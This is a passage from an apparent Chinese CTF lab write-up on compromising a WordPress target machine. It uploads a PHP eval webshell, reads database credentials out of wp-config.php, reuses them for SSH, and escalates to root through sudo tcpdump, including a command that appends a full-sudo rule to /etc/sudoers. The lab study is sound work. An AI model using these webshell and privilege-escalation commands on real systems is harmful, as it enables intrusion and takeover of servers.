+ 媒体库里也有文件上传的接口，但是不能直接上传 php 文件，可能需要配合上传`.user.ini`或者`.htaccess`文件和图片🐎来绕过安全检测来达到攻击目的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010346.png)

> 下面是用第一种方法打的

`horse.php`是一句话木马，内容为`<?php @eval($_POST['ma']);phpinfo(); ?>`

> `phpinfo()`函数执行成功会返回当前 php 环境的很多信息，用来判断木马是否被解析成 php 文件执行

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234216.png)

然后会显示无法安装包，但是我们的🐎还是上传上去了的

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234304.png)

访问我们的🐎，`http://192.168.17.134/wp-content/uploads/2020/12/horse.php`，出现`phpinfo`，ok

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201202234432.png)

拿`蚁剑`连，想直接拿到 flag ，但是权限太低了

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203010648.png)

但是可以看看敏感文件，`config`一般是配置文件，所以看看`wp-config.php`，发现了`MySQL`数据库的账号密码

账号：`webdeveloper`

密码：`MasterOfTheUniverse`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011027.png)

到这有点没思路了，想到靶机开放了`22`端口，可能账号密码跟这个会是一样的，开 xshell 尝试连接，结果成功了，`sudo -l`查看可以用的 root 命令有一个`tcpdump`

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011405.png)

但是尝试拿 flag 还是不够资格，需要继续提权，到这里已经不会了，去看了百度，说要用`tcpdump`提权

![](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203011606.png)

创建攻击脚本，名字叫`exploit`

```javascript
touch /tmp/exploit
```

写入 `shellcode`（要执行的代码）

```javascript
echo 'cat /root/flag.txt' > /tmp/exploit
```

赋予可执行权限

```javascript
chmod +x /tmp/exploit
// +x 参数表示给 exploit 文件赋予可执行权限
```

[Linux chmod命令详解](https://www.runoob.com/linux/linux-comm-chmod.html)

利用`tcpdump`执行任意命令

```javascript
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
```

> 用到的`tcpdump`命令：
>  `-i eth0` 从指定网卡捕获数据包
>  `-w /dev/null` 将捕获到的数据包输出到空设备（不输出数据包结果）
>  `-z [command]` 运行指定的命令
>  `-Z [user]` 指定用户执行命令
>  `-G [rotate_seconds]` 每rotate_seconds秒一次的频率执行`-w`指定的转储
>  `-W [num]` 指定抓包数量
>
> > `tcpdump`提权的原理就是利用`-z`和`-Z`，`-z`执行脚本，`-Z`指定以 `root` 用户执行脚本，从而提权
> >
> > ``-W` 1 `-G` 1，表示一次抓一个包，然后把这个包丢到黑洞里面，黑洞是 `dev/null`
> >
> > > `tcpdump`是什么
> > >
> > > 用简单的话来定义，就是：dump the traffic on a  network，根据使用者的定义对网络上的数据包进行截获的包分析工具。 可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。

拿到 flag

![flag](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203015122.png)

另一种提权思路，既然可以写 shell 了，可以直接给`webdeveloper`这个用户提升到`root`权限，直接写 shell 到`sudo`的配置文件`/etc/sudoers`里

```javascript
echo 'echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /etc/sudoers' > /tmp/exploit
chmod +x /tmp/exploit
sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
```

![flag too](https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201203020216.png)
